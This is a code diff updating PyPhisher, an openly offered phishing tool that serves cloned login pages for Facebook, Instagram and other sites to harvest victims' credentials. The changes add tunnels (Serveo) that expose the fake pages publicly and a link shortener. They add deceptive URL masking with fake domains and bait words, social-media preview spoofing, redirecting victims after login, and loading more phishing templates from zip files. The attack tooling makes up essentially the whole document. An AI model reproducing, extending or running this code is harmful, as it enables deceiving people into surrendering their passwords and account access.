@@ -3,9 +3,10 @@
 # Author     : KasRoudra
 # Version    : 2.1
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : KasRoudra (2021-2024)
 # Github     : https://github.com/KasRoudra
-# Contact    : https://m.me/KasRoudra
+# Gitlab     : https://gitlab.com/KasRoudra
+# Contact    : https://t.me/KasRoudra
 # Description: PyPhisher is a phishing tool in python
 # Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
 # 1st Commit : 08/08/2021
@@ -18,7 +19,7 @@
 """
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2021-2024 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -41,13 +42,12 @@ SOFTWARE.
 
 from argparse import ArgumentParser
 from importlib import import_module as eximport
-from glob import glob
 from hashlib import sha256
 from json import (
-    dumps as stringify,
     loads as parse
 )
 from os import (
+    chmod,
     getenv,
     kill,
     listdir,
@@ -56,9 +56,6 @@ from os import (
     mknod,
     popen,
     remove,
-    rename,
-    replace,
-    system
 )
 from os.path import (
     abspath,
@@ -71,43 +68,27 @@ from os.path import (
 from platform import uname
 from re import search, sub
 from shutil import (
-    copy as cp,
     copy2,
-    copyfile,
-    copytree,
     get_terminal_size,
     rmtree,
 )
 from signal import (
     SIGINT,
-    SIGKILL,
-    SIGTERM
 )
 from subprocess import (
     DEVNULL,
     PIPE,
     Popen,
-    STDOUT,
-    call,
     run
 )
 from smtplib import SMTP_SSL as smtp
-from socket import (
-    AF_INET as inet,
-    SOCK_STREAM as stream,
-    setdefaulttimeout,
-    socket
-)
 from sys import (
-    argv,
     stdout,
     version_info
 )
 from tarfile import open as taropen
 from time import (
-    ctime,
     sleep,
-    time
 )
 from zipfile import ZipFile
 
@@ -129,7 +110,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.1"
+version="2.1.8"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -148,7 +129,7 @@ logo = f"""
 {blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |{" "*19}       {cyan}[v{version}]
+{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
 {cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
 """
 
@@ -160,9 +141,24 @@ lx_help = f"""
 {blue}[3]{yellow} Login to your account
 {blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
 """
+shadow_help="""
+Shadow url is the url from which website previews are copied.
+When sending url through social media like facebook/telegram, 
+the previews are shown just below the url
+"""
+redir_help="""
+Redirection url is the url which is used to redirect victim after successful login
+"""
+curl_help="""
+Just a shortened url with your own masking
+"""
+zip_help="""
+Add more templates from a zip file which will be downloaded from input url
+"""
+
 
 packages = [ "php", "ssh" ]
-modules = [ "requests", "rich" ]
+modules = [ "requests", "rich", "beautifulsoup4:bs4" ]
 tunnelers = [ "cloudflared", "loclx" ]
 processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 
@@ -179,12 +175,16 @@ if version_info[0] != supported_version:
     exit(0)
 
 for module in modules:
+    if ":" in module:
+        module, importer = module.split(":")
+    else:
+        importer = module
     try:
-        eximport(module)
+        eximport(importer)
     except ImportError:
         try:
             print(f"Installing {module}")
-            run(f"pip3 install {module}", shell=True)
+            run(f"pip3 install {module} --break-system-packages", shell=True)
         except:
             print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
             exit(1)
@@ -192,14 +192,20 @@ for module in modules:
         exit(1)
 
 for module in modules:
+    if ":" in module:
+        module, importer = module.split(":")
+    else:
+        importer = module
     try:
-        eximport(module)
+        eximport(importer)
     except:
         print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
         exit(1)
 
+from bs4 import BeautifulSoup
 from requests import (
     get,
+    post,
     head,
     Session
 )
@@ -221,10 +227,11 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
-websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
+repo_url = "https://gitlab.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
+sites_repo = "https://gitlab.com/KasRoudra/pysites"
+websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
-# CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
+# CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun, SVO = Serveo
 
 home = getenv("HOME")
 ssh_dir = f"{home}/.ssh"
@@ -235,6 +242,7 @@ php_file = f"{tunneler_dir}/php.log"
 cf_file = f"{tunneler_dir}/cf.log"
 lx_file = f"{tunneler_dir}/loclx.log"
 lhr_file = f"{tunneler_dir}/lhr.log"
+svo_file = f"{tunneler_dir}/svo.log"
 site_dir = f"{home}/.site"
 cred_file = f"{site_dir}/usernames.txt"
 ip_file = f"{site_dir}/ip.txt"
@@ -277,6 +285,7 @@ argparser.add_argument("-u", "--url", help="Redirection url after data capture [
 argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
 argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
 argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
+argparser.add_argument("--kshrt", help="Show kshrt url [Default: False]", action="store_true")
 argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")
 
 
@@ -292,6 +301,7 @@ mode = args.mode
 troubleshoot = args.troubleshoot
 key = args.nokey if mode != "test" else False
 update = args.noupdate
+kshrt = args.kshrt
 
 local_url = f"127.0.0.1:{port}"
 
@@ -299,9 +309,11 @@ ts_commands = {
     "cloudflared": f"{cf_command} tunnel -url {local_url}",
     "localxpose": f"{lx_command} tunnel http -t {local_url}",
     "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "serveo": f"ssh -R 80:{local_url} serveo.net -T -n",
     "cf": f"{cf_command} tunnel -url {local_url}",
     "loclx": f"{lx_command} tunnel http -t {local_url}",
-    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
+    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n",
+    "svo": f"ssh -R 80:{local_url} serveo.net -T -n"
 }
 
 
@@ -322,11 +334,11 @@ def is_running(process):
 
 # Check if a json is valid
 def is_json(myjson):
-  try:
-    parse(myjson)
-    return True
-  except:
-    return False
+    try:
+        parse(myjson)
+        return True
+    except:
+        return False
 
 
 # A simple copy function
@@ -334,8 +346,16 @@ def copy(path1, path2):
     if isdir(path1):
         if isdir(path2):
              rmtree(path2)
+        for item in listdir(path1):
+            old_file = join(path1, item)
+            new_file = join(path2, item)
+            if isdir(old_file):
+                copy(old_file, new_file)
+            else:
+                makedirs(dirname(new_file), exist_ok=True)
+                copy2(old_file, new_file)
         #copytree(path1, path2)
-        shell(f"cp -r {path1} {path2}")
+        #shell(f"cp -r {path1} {path2}")
     if isfile(path1):
         if isdir(path2):
             copy2(path1, path2)
@@ -417,6 +437,8 @@ def append(text, filename):
     with open(filename, "a") as file:
         file.write(str(text)+"\n")
         
+def get_ver(ver):
+    return int(ver.replace(".", "", 2))
 
 def get_meta(url):
     # Facebook requires some additional header
@@ -442,9 +464,10 @@ def get_meta(url):
     allmeta = ""
     try:
         response = get(url, headers=headers).text
-        for line in response.split("\n"):
-            if line.strip().startswith("<meta "):
-                allmeta += line + "\n"
+        soup = BeautifulSoup(response, "html.parser")
+        metas = soup.find_all("meta")
+        if metas is not None and metas!=[]:
+            allmeta = "\n".join([str(meta) for meta in metas])
     except Exception as e:
         append(e, error_file)
     return allmeta
@@ -616,7 +639,6 @@ def readable(byte, precision = 2, is_speed = False):
 
 # Dowbload files with progress bar(if necessary)
 def download(url, path):
-    from time import ctime, time
     session = Session()
     filename = basename(path)
     directory = dirname(path)
@@ -624,7 +646,6 @@ def download(url, path):
     if directory!="" and not isdir(directory):
         mkdir(directory)
     newfile = filename.split(".")[0] if "." in filename else filename
-    newname = filename if len(filename) <= 12 else filename[:9]+"..."
     for i in range(retry):
         try:
             print()
@@ -634,7 +655,6 @@ def download(url, path):
                 if total_length is None: # no content length header
                     file.write(response.content)
                 else:
-                    downloaded = 0
                     total_length = int(total_length)
                     with Progress(
                         TextColumn("[bold blue]{task.fields[filename]}", justify="right"),
@@ -661,16 +681,24 @@ def download(url, path):
         pexit()
 
 # Extract zip/tar/tgz files
-def extract(file, extract_path='.'):
+def extract(file, extract_path='.', pwd=None):
     directory = dirname(extract_path)
     if directory!="" and not isdir(directory):
         mkdir(directory)
     try:
         if ".zip" in file:
             with ZipFile(file, 'r') as zip_ref:
-                if zip_ref.testzip() is None:
-                    zip_ref.extractall(extract_path)
-                else:
+                try:
+                    if pwd is None:
+                        zip_ref.extractall(extract_path)
+                    else:
+                        try:
+                            zip_ref.extractall(extract_path, pwd=bytes(pwd, "utf-8"))
+                        except:
+                            print(f"\n{error}Wrong password!")
+                            delete(file)
+                            exit()
+                except:
                     print(f"\n{error}Zip file corrupted!")
                     delete(file)
                     exit()
@@ -689,21 +717,59 @@ def extract(file, extract_path='.'):
         
 
 
-def write_meta(url):
-    if url=="":
+def write_meta():
+    global mode, url
+    if mode == "test":
         return
-    allmeta = get_meta(url)
-    if allmeta=="":
-        print(f"\n{error}URL isn't correct!")
-    write(allmeta, f"{site_dir}/meta.php")
+    while True:
+        if url is None or url == "":
+            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
+        else:
+            metaurl = url
+        if metaurl=="":
+            break
+        elif metaurl == "help":
+            sprint(shadow_help)
+        else:
+            allmeta = get_meta(metaurl)
+            if allmeta=="":
+                print(f"\n{error}No preview generated from specified URL!")
+            write(allmeta, f"{site_dir}/meta.php")
+            break
 
 
-def write_redirect(url):
-    global redir_url
-    if url == "":
-        url = redir_url
-    sed("redirectUrl", url, f"{site_dir}/login.php")
+def write_redirect():
+    global url, redir_url
+    while True:
+        if url is None or url == "":
+            redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
+        else:
+            redirect_url = url
+        if redirect_url is None or redirect_url == "":
+            redirect_url = redir_url
+            sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
+            break
+        else:
+            sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
+            break
+        if redirect_url == "help":
+            sprint(shadow_help)
 
+# Add more templates from zipfile from url
+def add_zip():
+    while True:
+        zip_url = input(f"\n{ask}Enter the download url of zipfile: ")
+        if zip_url is None or zip_url == "":
+            sprint(f"\n{error}No URL specified!")
+            break
+        elif zip_url=="help":
+            sprint(zip_help)
+        else:
+            download(zip_url, "sites.zip")
+            pwd = input(f"\n{ask}Enter the password of zipfile: ")
+            extract("sites.zip", sites_dir, pwd)
+            remove("sites.zip")
+            break
 
 # Polite Exit
 def pexit():
@@ -743,9 +809,11 @@ def show_options(sites):
             options += optioner(i, 20) + "\n"
     options += "\n"
     if isfile(saved_file) and cat(saved_file)!="":
-        options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} More Tools      {green}[{white}0{green}]{yellow} Exit\n\n"
+        options += f"{green}[{white}a{green}]{yellow} About  {green}[{white}o{green}]{yellow} AddZip  {green}[{white}s{green}]{yellow} Saved   {green}[{white}x{green}]{yellow} More Tools  {green}[{white}0{green}]{yellow} Exit\n\n"
+        #options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} More Tools      {green}[{white}0{green}]{yellow} Exit\n\n"
     else:
-        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
+        options += f"{green}[{white}a{green}]{yellow} About       {green}[{white}o{green}]{yellow} AddZip      {green}[{white}x{green}]{yellow} More Tools     {green}[{white}0{green}]{yellow} Exit\n\n"
+        #options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
     lolcat(options)
 
 
@@ -779,6 +847,9 @@ def ssh_key():
     is_known = bgtask("ssh-keygen -F localhost.run").wait()
     if is_known != 0:
         shell(f"ssh-keyscan -H localhost.run >> {ssh_dir}/known_hosts", True)
+    is_known2 = bgtask("ssh-keygen -F serveo.net").wait()
+    if is_known2 != 0:
+        shell(f"ssh-keyscan -H serveo.net >> {ssh_dir}/known_hosts", True)
 
 
 # Output urls
@@ -798,6 +869,31 @@ def url_manager(url, tunneler):
     #print(f"\n{info2}{arg1} > {yellow}{url}")
     #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
     sleep(0.5)
+
+def kshrten(url):
+    route_map = {
+        ".trycloudflare.com": "cf",
+        ".loclx.io": "lx",
+        ".lhr.life": "lhr",
+        ".lhr.pro": "lhro",
+        ".serveo.net": "svo",
+    }
+    for key in route_map.keys():
+        if key in url:
+            route = route_map[key]
+            subdomain = url.replace("https://", "").replace(key, "")
+    website = f"https://kshrt.onrender.com/{route}/{subdomain}"
+    internet()
+    try:
+        res = post(website, timeout=30).text
+    except Exception as e:
+        append(e, error_file)
+        res = ""
+    shortened = res.split("\n")[0] if "\n" in res else res
+    if "https://" not in shortened:
+        return ""
+    return shortened
+
 
 
 def shortener1(url):
@@ -836,7 +932,7 @@ def shortener3(url):
         append(e, error_file)
         res = ""
     shortened = res.split("\n")[0] if "\n" in res else res
-    if "https://" not in shortened:
+    if "http://" not in shortened and "https://" not in shortened:
         return ""
     return shortened
     
@@ -885,6 +981,7 @@ def about():
     print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
     print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{purple}{yellow}] ")
+    print(f"{red}{yellow}[{purple}Gitlab{yellow}]        {cyan} : {yellow}[{green}https://gitlab.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{purple}{yellow}] ")
     print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Telegram {yellow}]     {cyan} : {yellow}[{green}https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}\x6b\x61\x73\x72\x6f\x75\x64\x72\x61krd@gmail.com{yellow}] ")
@@ -898,9 +995,12 @@ def about():
 
 # Optional function for url masking
 def masking(url):
-    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
+    global kshrt
+    cust = "n" # input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y/N/help] : {yellow}")
     if cust in [ "", "n", "N", "no" ]:
         return
+    if cust == "help":
+        print(curl_help)
     if (shortened:=shortener1(url)) != "":
         pass
     elif (shortened:=shortener2(url)) != "":
@@ -908,25 +1008,48 @@ def masking(url):
     elif (shortened:=shortener3(url)) != "":
         pass
     else:
-        sprint(f"{error}Service not available!")
-        waiter()
-    short = shortened.replace("https://", "")
+        kurl = kshrten(url)
+        if (shortened:=shortener1(kurl)) != "":
+            pass
+        elif (shortened:=shortener2(kurl)) != "":
+            pass
+        elif (shortened:=shortener3(kurl)) != "":
+            pass
+        else:
+            sprint(f"\n{error}Service not available!")
+            waiter()
+    short = shortened.replace("http://", "").replace("https://", "")
     # Remove slash and spaces from inputs
     domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
     if domain == "":
         sprint(f"\n{error}No domain!")
         domain = "https://"
     else:
-        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
-        domain = "https://"+domain+"-"
+        domain = "https://" + sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
     bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
     if bait=="":
         sprint(f"\n{error}No bait word!")
+        if domain!="https://":
+            bait = "@"
     else:
-        bait = sub("([/%+&?={} ])", "-", bait)+"@"
+        if domain!="https://":
+            bait = "-" + sub("([/%+&?={} ])", "-", bait) + "@"
+        else:
+            bait = sub("([/%+&?={} ])", "-", bait) + "@"
     final = domain+bait+short
     print()
     #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
+    if kshrt:
+        kshrt_title = "[bold green]Kshrt[/]"
+        kshrt_text = f"[cyan]URL[/] [blue]:[/] [yellow]{kurl}[/]"
+        cprint(
+            Panel(
+                kshrt_text,
+                title=kshrt_title,
+                title_align="left",
+                border_style="green",
+            )
+        )
     title = "[bold blue]Custom[/]"
     text = f"[cyan]URL[/] [green]:[/] [yellow]{final}[/]"
     cprint(
@@ -947,15 +1070,21 @@ def updater():
     if not isfile("files/pyphisher.gif"):
         return
     try:
-        git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
+        toml_data = get("https://gitlab.com/KasRoudra/PyPhisher/-/raw/main/files/pyproject.toml").text
+        pattern = r'version\s*=\s*"([^"]+)"'
+        match = search(pattern, toml_data)
+        if match:
+            gl_ver = match.group(1)
+        else:
+            gl_ver = "404: Not Found"
     except Exception as e:
         append(e, error_file)
-        git_ver = version
-    if git_ver != "404: Not Found" and float(git_ver) > float(version):
+        gl_ver = version
+    if gl_ver != "404: Not Found" and get_ver(gl_ver) > get_ver(version):
         # Changelog of each versions are seperated by three empty lines
-        changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
+        changelog = get("https://gitlab.com/KasRoudra/PyPhisher/-/raw/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
-        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
+        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{gl_ver}")
         upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
         if upask=="y":
             print(nc)
@@ -1059,7 +1188,7 @@ def requirements():
         remove("loclx.zip")
     for tunneler in tunnelers:
         if isfile(f"{tunneler_dir}/{tunneler}"):
-            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
+            chmod(f"{tunneler_dir}/{tunneler}", 0o755)
     for process in processes:
         if is_running(process):
             print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
@@ -1079,10 +1208,15 @@ def requirements():
     if isfile(f"{sites_dir}/version.txt"):
         with open(f"{sites_dir}/version.txt", "r") as sites_file:
             zipver=sites_file.read().strip()
-            if float(version) > float(zipver):
-                download(websites_url, "websites.zip")
+            if get_ver(version) > get_ver(zipver):
+                # download(websites_url, "websites.zip")
+                print(f"\n{info2}Downloading website files....{nc}")
+                delete(sites_dir)
+                shell(f"git clone {sites_repo} {sites_dir}")
     else:
-        download(websites_url, "websites.zip")
+        # download(websites_url, "websites.zip")
+        print(f"\n{info2}Downloading website files....{nc}")
+        shell(f"git clone {sites_repo} {sites_dir}")
     if isfile("websites.zip"):
         delete(sites_dir, recreate=True)
         extract("websites.zip", sites_dir)
@@ -1115,17 +1249,17 @@ def main_menu():
         command = ts_commands[troubleshoot]
         shell(command)
         pexit()
-    tempdata = cat(templates_file)
-    if is_json(tempdata):
-        sites = parse(tempdata)
-    else:
-        sprint(f"\n{error}templates.json file is corrupted!")
-        exit(1)
-    customdir = None
-    otp_folder = ""
-    names = [site["name"] for site in sites]
-    choices = [str(i) for i in range(1,len(sites)+1)]
     while True:
+        tempdata = cat(templates_file)
+        if is_json(tempdata):
+            sites = parse(tempdata)
+        else:
+            sprint(f"\n{error}templates.json file is corrupted!")
+            exit(1)
+        customdir = None
+        otp_folder = ""
+        names = [site["name"] for site in sites]
+        choices = [str(i) for i in range(1,len(sites)+1)]
         clear(lol=True)
         show_options(names)
         if option is not None:
@@ -1154,6 +1288,8 @@ def main_menu():
             break
         elif choice.lower()=="a":
             about()
+        elif choice.lower()=="o":
+            add_zip()
         elif choice.lower()=="s":
             saved()
         elif choice.lower()=="m":
@@ -1172,19 +1308,13 @@ def main_menu():
             extract("site.zip", site)
             remove("site.zip")
         copy(site, site_dir)
-        if mode == "test":
-            metaurl = ""
-        else:
-            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
-        write_meta(metaurl)
+        write_meta()
         if url is not None:
             redirect_url = url
         else:
             if mode == "test":
                 redirect_url = ""
-            else:
-                redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
-        write_redirect(redirect_url)
+        write_redirect()
     server()
 
 # Start server and tunneling
@@ -1196,7 +1326,7 @@ def server():
         sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
         sleep(2)
     sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
-    for logfile in [php_file, cf_file, lx_file, lhr_file]:
+    for logfile in [php_file, cf_file, lx_file, lhr_file, svo_file]:
         delete(logfile)
         if not isfile(logfile):
             try:
@@ -1208,6 +1338,7 @@ def server():
     cf_log = open(cf_file, "w")
     lx_log = open(lx_file, "w")
     lhr_log = open(lhr_file, "w")
+    svo_log = open(svo_file, "w")
     internet()
     bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
     sleep(2)
@@ -1234,33 +1365,41 @@ def server():
         bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+    bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log, stderr=svo_log)
     sleep(10)
     cf_success = False
-    for i in range(10):
+    for _ in range(10):
         cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
         if cf_url != "":
             cf_success = True
             break
         sleep(1)
     lx_success = False
-    for i in range(10):
+    for _ in range(10):
         lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
         if lx_url != "https://":
             lx_success = True
             break
         sleep(1)
     lhr_success = False
-    for i in range(10):
-        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
+    for _ in range(10):
+        lhr_url = grep("(https://[-0-9a-z.]*.lhr.(life|pro))", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
         sleep(1)
-    if cf_success or lx_success or lhr_success:
+    svo_success = False
+    for _ in range(10):
+        svo_url = grep("(https://[-0-9a-z.]*.serveo.net)", svo_file)
+        if svo_url != "":
+            svo_success = True
+            break
+        sleep(1)
+    if cf_success or lx_success or lhr_success or svo_success:
         sprint(f"\n{info}Your urls are given below:\n")
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
-            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
             pexit()
         if cf_success:
             url_manager(cf_url, "CloudFlared")
@@ -1268,11 +1407,15 @@ def server():
             url_manager(lx_url, "LocalXpose")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
+        if svo_success:
+            url_manager(svo_url, "Serveo")
         if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
         elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
         elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
+            masking(cf_url)
+        elif svo_success and tunneler.lower() in [ "serveo", "svo" ]:
             masking(cf_url)
         else:
             print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
@@ -1314,12 +1457,15 @@ def waiter():
     except KeyboardInterrupt:
         pexit()
 
-if __name__ == '__main__':
+def main():
     try:
         main_menu()
     except KeyboardInterrupt:
         pexit()
     except Exception as e:
         exception_handler(e)
+
+if __name__ == '__main__':
+    main()
             
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
